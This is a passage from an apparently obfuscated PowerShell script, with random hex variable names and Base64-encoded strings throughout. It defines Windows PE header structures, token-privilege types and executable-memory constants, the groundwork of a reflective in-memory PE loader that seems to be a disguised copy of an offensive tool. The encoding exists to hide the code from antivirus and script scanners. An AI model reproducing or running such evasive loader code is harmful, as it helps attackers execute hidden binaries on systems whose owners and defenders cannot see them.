		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${20d2abe55fa9478ea915892ee916788f}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${a722336415a9478bbe07a1db32253fe0} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${a722336415a9478bbe07a1db32253fe0}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 64)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${566279db79984ab3b038b3a1ae93d50a} = ${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${5752bfa9b4ef4a04b92d1331d33f6e7d} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${7b497549a3884d798253323f16ae49b6} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${b30d0291a0194974857ba3f63f1e001d} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${4d3b26e5cca545fe87182df4095ec5bb}, ${5752bfa9b4ef4a04b92d1331d33f6e7d}, ${7b497549a3884d798253323f16ae49b6}, @([Int32] 4))
		${566279db79984ab3b038b3a1ae93d50a}.SetCustomAttribute(${b30d0291a0194974857ba3f63f1e001d})
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${0a8b702f85d74ea3bf4a0ca8c7d4bc93} = ${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${5752bfa9b4ef4a04b92d1331d33f6e7d} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${b30d0291a0194974857ba3f63f1e001d} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${4d3b26e5cca545fe87182df4095ec5bb}, ${5752bfa9b4ef4a04b92d1331d33f6e7d}, ${7b497549a3884d798253323f16ae49b6}, @([Int32] 10))
		${0a8b702f85d74ea3bf4a0ca8c7d4bc93}.SetCustomAttribute(${b30d0291a0194974857ba3f63f1e001d})
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${33d8bae7e8874fd8a979c7abae6f62c3} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()	
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${33d8bae7e8874fd8a979c7abae6f62c3}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 40)
		${053df94e7b8f49c48d6805dfafdb5411} = ${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${5752bfa9b4ef4a04b92d1331d33f6e7d} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${b30d0291a0194974857ba3f63f1e001d} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${4d3b26e5cca545fe87182df4095ec5bb}, ${5752bfa9b4ef4a04b92d1331d33f6e7d}, ${7b497549a3884d798253323f16ae49b6}, @([Int32] 8))
		${053df94e7b8f49c48d6805dfafdb5411}.SetCustomAttribute(${b30d0291a0194974857ba3f63f1e001d})
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBhAHcARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUgBlAGwAbwBjAGEAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8ATABpAG4AZQBuAHUAbQBiAGUAcgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAZQBsAG8AYwBhAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEwAaQBuAGUAbgB1AG0AYgBlAHIAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${f98264d65c2a41edbcf42ba111f713f9} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value ${f98264d65c2a41edbcf42ba111f713f9}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AQgBBAFMARQBfAFIARQBMAE8AQwBBAFQASQBPAE4A'))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 8)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQgBsAG8AYwBrAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${e156da290f814968a1a28c7f5465b2b5} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value ${e156da290f814968a1a28c7f5465b2b5}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ASQBNAFAATwBSAFQAXwBEAEUAUwBDAFIASQBQAFQATwBSAA=='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 20)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAdwBhAHIAZABlAHIAQwBoAGEAaQBuAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAHIAcwB0AFQAaAB1AG4AawA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${e367c8e5565d4d8b893ad2f4bf71da74} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value ${e367c8e5565d4d8b893ad2f4bf71da74}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARQBYAFAATwBSAFQAXwBEAEkAUgBFAEMAVABPAFIAWQA='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 40)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAEYAdQBuAGMAdABpAG8AbgBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAE4AYQBtAGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARgB1AG4AYwB0AGkAbwBuAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYATgBhAG0AZQBPAHIAZABpAG4AYQBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${f491151a39014001a4e6f3e5f04aaf7f} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value ${f491151a39014001a4e6f3e5f04aaf7f}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARAA='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 8)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcAUABhAHIAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABpAGcAaABQAGEAcgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${286036712b344d01a6b8ce651afe96eb} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name LUID -Value ${286036712b344d01a6b8ce651afe96eb}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABVAEkARABfAEEATgBEAF8AQQBUAFQAUgBJAEIAVQBUAEUAUwA='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 12)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TAB1AGkAZAA='))), ${286036712b344d01a6b8ce651afe96eb}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${c78348ca7ccb4373a633ee23b81915c7} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value ${c78348ca7ccb4373a633ee23b81915c7}
		${51a71380725d4b7a889b0453a31c6e35} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${065aa676fc9640529d9c661c49eabd94} = ${6d8532d17f8644369d653fb2b0b0f4ca}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABPAEsARQBOAF8AUABSAEkAVgBJAEwARQBHAEUAUwA='))), ${51a71380725d4b7a889b0453a31c6e35}, [System.ValueType], 16)
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAQwBvAHUAbgB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${065aa676fc9640529d9c661c49eabd94}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAcwA='))), ${c78348ca7ccb4373a633ee23b81915c7}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${e9e67a95922842bc8da31f90b2efb6e3} = ${065aa676fc9640529d9c661c49eabd94}.CreateType()
		${c3c389d397344cdcb031960f029f7926} | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value ${e9e67a95922842bc8da31f90b2efb6e3}
		return ${c3c389d397344cdcb031960f029f7926}
	}
	Function Get-Win32Constants
	{
		${bf6addb5678a4306bbd927c2e94d4ede} = New-Object System.Object
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		${bf6addb5678a4306bbd927c2e94d4ede} | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
